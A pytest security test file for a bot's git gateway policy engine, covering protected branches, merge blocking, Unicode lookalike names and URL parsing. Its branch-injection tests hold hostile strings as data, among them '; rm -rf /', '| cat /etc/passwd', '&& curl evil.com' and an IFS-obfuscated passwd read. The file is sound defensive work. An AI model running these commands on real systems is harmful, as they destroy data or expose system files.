"""
Tests for policy bypass prevention.

Security Properties Tested:
- Command injection in git arguments blocked
- Unicode/encoding tricks in branch names rejected
- Protected branch rules enforced
- Merge operations always blocked

Attack Vectors:
- CWE-78: Improper Neutralization of Special Elements in OS Command
- CWE-176: Improper Handling of Unicode Encoding
- CWE-20: Improper Input Validation
- CWE-863: Incorrect Authorization

References:
- OWASP Top 10: A01:2021 - Broken Access Control
- OWASP Top 10: A03:2021 - Injection
"""

import os
import sys
from pathlib import Path
from types import ModuleType
from unittest.mock import MagicMock

import pytest

# Add project paths
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "shared"))


def _load_policy_module():
    """Load policy module with proper import handling."""
    gateway_dir = PROJECT_ROOT / "gateway"
    shared_dir = PROJECT_ROOT / "shared"

    # Set up environment
    os.environ.setdefault("GATEWAY_BOT_NAME", "james-in-a-box")
    os.environ.setdefault("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")

    sys.path.insert(0, str(shared_dir))
    sys.path.insert(0, str(gateway_dir))

    # Load github_client first
    github_client_path = gateway_dir / "github_client.py"
    github_client_source = github_client_path.read_text()
    github_client_module = ModuleType("github_client")
    github_client_module.__file__ = str(github_client_path)
    exec(compile(github_client_source, github_client_path, "exec"), github_client_module.__dict__)
    sys.modules["github_client"] = github_client_module

    # Load policy module
    policy_path = gateway_dir / "policy.py"
    policy_source = policy_path.read_text()
    policy_source = policy_source.replace("from .github_client import", "from github_client import")
    policy_module = ModuleType("policy")
    policy_module.__file__ = str(policy_path)
    exec(compile(policy_source, policy_path, "exec"), policy_module.__dict__)
    sys.modules["policy"] = policy_module

    return policy_module


@pytest.mark.security
class TestProtectedBranchEnforcement:
    """Tests for protected branch access control.

    CWE-863: Incorrect Authorization
    Ensures pushes to protected branches are always blocked.
    """

    @pytest.fixture
    def policy_engine(self, monkeypatch):
        """Create a policy engine for testing."""
        monkeypatch.setenv("GATEWAY_BOT_NAME", "james-in-a-box")
        monkeypatch.setenv("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")

        policy = _load_policy_module()
        policy._reset_bot_config_caches()

        mock_github = MagicMock()
        mock_github.list_prs_for_branch.return_value = []
        return policy.PolicyEngine(github_client=mock_github)

    @pytest.mark.parametrize(
        "branch",
        [
            "main",
            "master",
        ],
    )
    def test_protected_branch_push_blocked(self, policy_engine, branch):
        """Verify pushes to main/master are always blocked.

        Defense: Protected branches are hardcoded and always rejected.
        Attack vector: Bypassing branch protection to modify production code.
        """
        result = policy_engine.check_branch_ownership("owner/repo", branch)

        assert not result.allowed
        assert "protected" in result.reason.lower()

    @pytest.mark.parametrize(
        "branch",
        [
            "main",
            "master",
        ],
    )
    def test_protected_branch_blocked_even_with_pr(self, policy_engine, branch, monkeypatch):
        """Verify protected branches blocked even if there's a bot PR.

        Defense: Protected branch check happens before PR ownership check.
        Attack vector: Creating a PR to bypass protected branch rules.
        """
        # Mock a PR that would normally grant access
        policy_engine.github.list_prs_for_branch.return_value = [
            {"number": 1, "author": {"login": "james-in-a-box"}, "state": "open", "headRefName": branch}
        ]
        policy_engine.github.get_pr_info.return_value = {
            "number": 1,
            "author": {"login": "james-in-a-box"},
            "state": "open",
            "headRefName": branch,
        }

        result = policy_engine.check_branch_ownership("owner/repo", branch)

        # Should still be blocked
        assert not result.allowed
        assert "protected" in result.reason.lower()


@pytest.mark.security
class TestMergeBlockEnforcement:
    """Tests for merge operation blocking.

    CWE-863: Incorrect Authorization
    Ensures merge operations are ALWAYS blocked (gateway policy).
    """

    @pytest.fixture
    def policy_engine(self, monkeypatch):
        """Create a policy engine for testing."""
        monkeypatch.setenv("GATEWAY_BOT_NAME", "james-in-a-box")
        monkeypatch.setenv("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")

        policy = _load_policy_module()
        policy._reset_bot_config_caches()

        mock_github = MagicMock()
        return policy.PolicyEngine(github_client=mock_github)

    def test_merge_always_blocked(self, policy_engine):
        """Verify merge operations are unconditionally blocked.

        Defense: check_merge_allowed() always returns False.
        Attack vector: Bot merging its own PRs without human review.
        """
        result = policy_engine.check_merge_allowed("owner/repo", 123)

        assert not result.allowed
        assert "not supported" in result.reason.lower()
        assert "human" in result.reason.lower()

    def test_merge_blocked_for_any_pr(self, policy_engine):
        """Verify merge blocked for any PR number.

        Defense: No special cases in merge blocking.
        Attack vector: Using special PR numbers to bypass merge block.
        """
        for pr_number in [0, 1, 999, 9999999, -1]:
            result = policy_engine.check_merge_allowed("owner/repo", pr_number)
            assert not result.allowed


@pytest.mark.security
class TestBranchNameInjection:
    """Tests for branch name injection attacks.

    CWE-78: Improper Neutralization of Special Elements in OS Command
    Ensures branch names with injection attempts are handled safely.
    """

    @pytest.fixture
    def policy_engine(self, monkeypatch):
        """Create a policy engine for testing."""
        monkeypatch.setenv("GATEWAY_BOT_NAME", "james-in-a-box")
        monkeypatch.setenv("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")

        policy = _load_policy_module()
        policy._reset_bot_config_caches()

        mock_github = MagicMock()
        mock_github.list_prs_for_branch.return_value = []
        mock_github.branch_exists.return_value = False
        return policy.PolicyEngine(github_client=mock_github)

    @pytest.mark.parametrize(
        "branch",
        [
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "'; DROP TABLE users; --",
            "${IFS}cat${IFS}/etc/passwd",
            "branch\x00name",  # Null byte
            "branch\nnewline",  # Newline
        ],
    )
    def test_command_injection_branch_names(self, policy_engine, branch):
        """Verify command injection attempts in branch names don't cause issues.

        Defense: Branch names are treated as data, not executed.
        Attack vector: Injection via branch name when git commands are constructed.
        """
        # These should not raise exceptions and should be rejected as not bot-owned
        result = policy_engine.check_branch_ownership("owner/repo", branch)

        # The policy check should complete without error
        # (whether allowed or not depends on other factors, but no crash/injection)
        assert isinstance(result.allowed, bool)

    @pytest.mark.parametrize(
        "branch",
        [
            "james-in-a-box-$(whoami)",  # Injection attempt with valid prefix
            "james-in-a-box/`id`",  # Injection attempt with valid prefix
            "james-in-a-box-; rm -rf /",
        ],
    )
    def test_injection_with_valid_prefix(self, policy_engine, branch):
        """Verify injection attempts pass prefix check but don't execute.

        Defense: Prefix check is string-only, no command execution.
        Attack vector: Using valid prefix to hide injection payload.
        """
        result = policy_engine.check_branch_ownership("owner/repo", branch)

        # Branch with bot prefix should be allowed (prefix match is purely string-based)
        # This is correct behavior - we're testing that the injection doesn't execute
        assert result.allowed  # Prefix is valid
        assert "bot-prefixed" in result.reason


@pytest.mark.security
class TestUnicodeEncodingTricks:
    """Tests for Unicode encoding bypass attempts.

    CWE-176: Improper Handling of Unicode Encoding
    Ensures Unicode tricks don't bypass branch prefix checks.
    """

    @pytest.fixture
    def policy_engine(self, monkeypatch):
        """Create a policy engine for testing."""
        monkeypatch.setenv("GATEWAY_BOT_NAME", "james-in-a-box")
        monkeypatch.setenv("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")

        policy = _load_policy_module()
        policy._reset_bot_config_caches()

        mock_github = MagicMock()
        mock_github.list_prs_for_branch.return_value = []
        return policy.PolicyEngine(github_client=mock_github)

    @pytest.mark.parametrize(
        "branch",
        [
            "egg\u200b-feature",  # Zero-width space before dash
            "egg\u200b/feature",  # Zero-width space before slash
            "\u200begg-feature",  # Zero-width space at start
            "еgg-feature",  # Cyrillic 'е' instead of Latin 'e'
            "ēgg-feature",  # Latin 'e' with macron
            "egg\uff0dfeature",  # Fullwidth hyphen-minus
            "egg\u2044feature",  # Fraction slash (not forward slash)
        ],
    )
    def test_unicode_lookalike_prefix_rejected(self, policy_engine, branch):
        """Verify Unicode lookalike prefixes don't match.

        Defense: Exact string matching for prefixes.
        Attack vector: Using visually similar Unicode to bypass prefix check.
        """
        result = policy_engine.check_branch_ownership("owner/repo", branch)

        # These should NOT be recognized as valid egg- or egg/ prefixes
        # because they use lookalike characters
        assert not result.allowed or "bot-prefixed" not in result.reason

    @pytest.mark.parametrize(
        "branch",
        [
            "\u202eegg/feature",  # Right-to-left override
            "feature/\u202ejames-in-a-box",  # RTL override to make "egg" appear first
        ],
    )
    def test_rtl_override_rejected(self, policy_engine, branch):
        """Verify RTL override characters don't trick prefix matching.

        Defense: Prefix matching is byte-order based, not visual.
        Attack vector: Using RTL override to make branch visually appear valid.
        """
        result = policy_engine.check_branch_ownership("owner/repo", branch)

        # RTL overrides should not make these appear as egg-prefixed
        assert not result.allowed or "bot-prefixed" not in result.reason


@pytest.mark.security
class TestRefspecExtraction:
    """Tests for refspec parsing security.

    CWE-20: Improper Input Validation
    Ensures refspec parsing handles edge cases safely.
    """

    @pytest.fixture
    def policy_module(self, monkeypatch):
        """Load policy module."""
        monkeypatch.setenv("GATEWAY_BOT_NAME", "james-in-a-box")
        monkeypatch.setenv("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")
        return _load_policy_module()

    @pytest.mark.parametrize(
        "refspec,expected",
        [
            ("", None),  # Empty
            ("main", "main"),  # Simple
            ("refs/heads/feature", "feature"),  # Full ref
            ("+main", "main"),  # Force push
            ("local:remote", "remote"),  # Refspec
            ("+refs/heads/local:refs/heads/remote", "remote"),  # Full refspec
        ],
    )
    def test_refspec_extraction_edge_cases(self, policy_module, refspec, expected):
        """Verify refspec extraction handles edge cases correctly.

        Defense: extract_branch_from_refspec handles all valid formats.
        Attack vector: Malformed refspecs causing unexpected behavior.
        """
        result = policy_module.extract_branch_from_refspec(refspec)
        assert result == expected

    @pytest.mark.parametrize(
        "refspec",
        [
            "a" * 10000,  # Very long
            ":" * 100,  # Many colons
            "refs/heads/../../../etc/passwd",  # Path traversal attempt
        ],
    )
    def test_refspec_extraction_malicious_input(self, policy_module, refspec):
        """Verify refspec extraction doesn't crash on malicious input.

        Defense: Function handles any string input without raising exceptions.
        Attack vector: Crafted input causing crashes or undefined behavior.
        """
        # Should not raise an exception
        result = policy_module.extract_branch_from_refspec(refspec)
        assert result is None or isinstance(result, str)


@pytest.mark.security
class TestRemoteURLExtraction:
    """Tests for remote URL parsing security.

    CWE-20: Improper Input Validation
    Ensures remote URL parsing handles edge cases safely.
    """

    @pytest.fixture
    def policy_module(self, monkeypatch):
        """Load policy module."""
        monkeypatch.setenv("GATEWAY_BOT_NAME", "james-in-a-box")
        monkeypatch.setenv("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")
        return _load_policy_module()

    @pytest.mark.parametrize(
        "url",
        [
            "https://evil.com/github.com/owner/repo.git",  # Domain in path
            "https://github.com.evil.com/owner/repo.git",  # Subdomain trick
            "ssh://git@github.com.evil.com:owner/repo.git",  # SSH subdomain trick
        ],
    )
    def test_non_github_urls_rejected(self, policy_module, url):
        """Verify non-GitHub URLs are not extracted.

        Defense: Only github.com domain is accepted.
        Attack vector: Tricking gateway into thinking evil repo is GitHub.
        """
        result = policy_module.extract_repo_from_remote(url)
        # Should either return None or the correct repo if it's actually GitHub
        if result:
            # If it returns something, verify it's from the actual github.com
            assert "evil" not in result

    @pytest.mark.parametrize(
        "url",
        [
            "not-a-url",
            "",
        ],
    )
    def test_invalid_url_formats_rejected(self, policy_module, url):
        """Verify invalid URL formats return None.

        Defense: Only valid HTTPS and SSH GitHub URLs are accepted.
        Attack vector: Unusual URL formats causing unexpected parsing.
        """
        result = policy_module.extract_repo_from_remote(url)
        assert result is None

    @pytest.mark.parametrize(
        "url,contains_github",
        [
            ("ftp://github.com/owner/repo", True),  # Wrong protocol but has github.com
            ("file:///github.com/owner/repo", True),  # File protocol but has github.com
        ],
    )
    def test_url_with_github_in_path_extraction(self, policy_module, url, contains_github):
        """Verify URLs with github.com are handled consistently.

        Note: The regex matches github.com in any position, which extracts
        owner/repo even from non-HTTPS URLs. This is acceptable as the
        URL is never executed - it's just used for repo identification.
        """
        result = policy_module.extract_repo_from_remote(url)
        # The regex does match github.com in these URLs
        if contains_github:
            # These may extract successfully since github.com is present
            # This behavior is documented and acceptable
            assert result is None or result == "owner/repo"


@pytest.mark.security
class TestPROwnershipBypass:
    """Tests for PR ownership check bypass attempts.

    CWE-863: Incorrect Authorization
    Ensures PR ownership can't be spoofed.
    """

    @pytest.fixture
    def policy_engine(self, monkeypatch):
        """Create a policy engine for testing."""
        monkeypatch.setenv("GATEWAY_BOT_NAME", "james-in-a-box")
        monkeypatch.setenv("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")

        policy = _load_policy_module()
        policy._reset_bot_config_caches()

        mock_github = MagicMock()
        return policy.PolicyEngine(github_client=mock_github)

    @pytest.mark.parametrize(
        "author",
        [
            "Egg",  # Case mismatch
            "EGG",  # All caps
            "egg ",  # Trailing space
            " egg",  # Leading space
            "egg\x00",  # Null byte
            "еgg",  # Cyrillic 'е'
        ],
    )
    def test_author_name_variations_rejected(self, policy_engine, author):
        """Verify author name variations don't bypass bot check.

        Defense: Case-insensitive comparison but exact character match.
        Attack vector: Spoofing author with lookalike username.
        """
        policy_engine.github.get_pr_info.return_value = {
            "number": 123,
            "author": {"login": author},
            "state": "open",
            "headRefName": "feature",
        }

        result = policy_engine.check_pr_ownership("owner/repo", 123)

        # Non-exact matches should be rejected (except for case variations
        # which may be legitimately handled)
        if result.allowed:
            # If allowed, verify it's a legitimate case match
            assert author.strip().lower() == "james-in-a-box"
